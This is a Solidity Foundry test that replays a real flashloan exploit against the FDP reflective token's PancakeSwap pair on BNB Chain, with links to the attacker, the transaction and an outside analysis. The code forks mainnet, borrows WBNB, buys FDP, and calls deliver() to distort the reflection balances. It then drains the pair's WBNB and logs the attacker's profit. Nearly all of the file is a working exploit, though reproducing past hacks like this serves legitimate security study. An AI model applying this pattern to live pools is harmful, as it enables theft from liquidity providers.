// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// Attacker: https://bscscan.com/address/0xc726bd0e973722e17eb088b8fcfedaa931fa0293
// Attack Contract: https://bscscan.com/address/0xe02970bd38b283c3079720c1e71001abe001bc83
// Attack Tx: https://phalcon.blocksec.com/tx/bsc/0x09925028ce5d6a54801d04ff8f39e79af6c24289e84b301ddcdb6adfa51e901b
//            https://bscscan.com/tx/0x09925028ce5d6a54801d04ff8f39e79af6c24289e84b301ddcdb6adfa51e901b

// @Analysis
// https://twitter.com/BeosinAlert/status/1622806011269771266

contract Exploit is Test {
    IWETH private constant WBNB = IWETH(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    reflectiveERC20 private constant FDP = reflectiveERC20(0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07);
    IUniswapV2Pair private constant FDP_WBNB = IUniswapV2Pair(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3);

    IRouter private constant router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDPPOracle private constant DPP = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);

    function testHack() external {
        vm.createSelectFork("https://1rpc.io/bnb", 25_430_418);

        // flashloan 16.32 WBNB
        DPP.flashLoan(16.32 ether, 0, address(this), "0x1");
    }

    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
        // console.log("%s FDP in Pair before swap", FDP.balanceOf(address(FDP_WBNB)) / 1e18);  // putting console.log here make test fail ?

        // swap some WBNB to FDP
        WBNB.approve(address(router), type(uint256).max);
        FDP.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(FDP);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            16.32 ether, 0, path, address(this), type(uint256).max
        );

        console.log("%s FDP in Pair before deliver", FDP.balanceOf(address(FDP_WBNB)) / 1e18);
        console.log("%s FDP in attack contract before deliver", FDP.balanceOf(address(this)) / 1e18);
        console.log("-------------Delivering-------------");
        // 49925109590047580102880 in attack contract before deliver
        FDP.deliver(28_463.16 ether); // 28463162603585437380302 (8 decimals)

        console.log("%s FDP in Pair after deliver", FDP.balanceOf(address(FDP_WBNB)) / 1e18);
        console.log("%s FDP in attack contract after deliver", FDP.balanceOf(address(this)) / 1e18);

        FDP_WBNB.swap(
            0,
            WBNB.balanceOf(address(FDP_WBNB)) - 0.15 ether, // 32.44 ether
            address(this),
            ""
        );

        // repay
        WBNB.transfer(address(DPP), baseAmount);
        console.log("\n Attacker's profit: %s WBNB", WBNB.balanceOf(address(this)) / 1e18);
    }
}

/* -------------------- Interface -------------------- */
interface reflectiveERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function deliver(uint256 tAmount) external;
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address sender, bytes calldata data) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function balanceOf(address) external view returns (uint256);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}
